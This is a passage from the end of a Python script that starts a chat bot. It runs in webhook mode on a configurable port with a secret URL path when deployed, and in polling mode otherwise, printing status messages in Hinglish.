        port = int(os.environ.get("PORT", "8000"))
        webhook_url = f"{base_url.rstrip('/')}/{webhook_secret}"
        print("Bot webhook mode mein chal raha hai.")
        app.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path=webhook_secret,
            webhook_url=webhook_url,
        )
    else:
        print("Bot polling mode mein chal raha hai (local).")
        app.run_polling()


if __name__ == "__main__":
    main()
